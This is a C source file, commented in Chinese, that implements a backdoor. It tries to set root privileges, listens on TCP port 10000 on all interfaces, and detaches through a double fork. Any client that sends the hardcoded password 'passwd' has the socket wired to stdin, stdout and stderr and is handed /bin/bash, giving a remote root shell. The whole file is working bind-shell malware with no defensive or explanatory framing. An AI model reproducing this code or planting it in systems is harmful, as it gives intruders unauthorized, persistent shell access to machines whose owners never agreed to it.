#include<stdio.h>  
#include<stdlib.h>  
#include<string.h>  
#include<errno.h>  
#include<sys/types.h>  
#include<sys/socket.h>  
#include<netinet/in.h> 
#include <fcntl.h>
#include<unistd.h>  
#define DEFAULT_PORT 10000  
#define MAXLINE 4096  

char *p="Connect successed, please input your passwd:";

int main(int argc, char** argv)  
{  
	if(setuid(0)<0) {printf("setuid error!\n");exit(1);}
        if(seteuid(0)<0) {printf("seteuid error!\n");exit(1);}
        printf("real id is %d. effective id is %d.\n",getuid(),geteuid());

    int    socket_fd, connect_fd;
    //初始化    
    struct sockaddr_in     servaddr;  
    char    buff[MAXLINE];  
    int     n;  
    //初始化Socket  
    if( (socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1 ){  
    	printf("create socket error: %s(errno: %d)\n",strerror(errno),errno);  
    exit(0);  
    }  
    memset(&servaddr, 0, sizeof(servaddr));  
    servaddr.sin_family = AF_INET;  
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);//IP地址设置成INADDR_ANY,让系统自动获取本机的IP地址。  
    servaddr.sin_port = htons(DEFAULT_PORT);//设置的端口为DEFAULT_PORT  
  
    //将本地地址绑定到所创建的套接字上  
    if( bind(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)) == -1){  
    	printf("bind socket error: %s(errno: %d)\n",strerror(errno),errno);  
    exit(0);  
    }  
    //开始监听是否有客户端连接  
    if( listen(socket_fd, 10) == -1){  
    	printf("listen socket error: %s(errno: %d)\n",strerror(errno),errno);  
    exit(0);  
    }  
    printf("======waiting for client's request======\n");  
    while(1){  
    //阻塞直到有客户端连接。  
        if( (connect_fd = accept(socket_fd, (struct sockaddr*)NULL, NULL)) == -1){  
        	printf("accept socket error: %s(errno: %d)",strerror(errno),errno);  
	}

    pid_t pid;
    pid = fork();                                      /*创建子进程*/
        if (!pid) {
            if ((pid = fork()) > 0)                         /*创建孙进程*/
            {
                exit(0);                          /*子进程终结*/
            } else if (!pid) {                       /*孙进程处理链接请求*/
                write(connect_fd, p, strlen(p));
                memset(buff, '\0', MAXLINE);
                read(connect_fd, buff, MAXLINE);
                if (strncmp(buff, "passwd",6 ) != 0) {
                    close(connect_fd);
                    exit(0);
                } else {
                    write(connect_fd, "log in\n", 7);
                    dup2(connect_fd, fileno(stdin));               /*将标准输入、输出、出错重定向到我们的套接字上*/
                    dup2(connect_fd, fileno(stdout));               /*实质是套接字的复制*/
                    dup2(connect_fd, fileno(stderr));
                    execlp("/bin/bash", "/bin/bash", NULL);      /*打开一个shell代替本进程*/
                }
            }

	}

	close(connect_fd);
	if(waitpid(pid,NULL,0)!=pid)
		printf("waited error\n");
    }    
} 
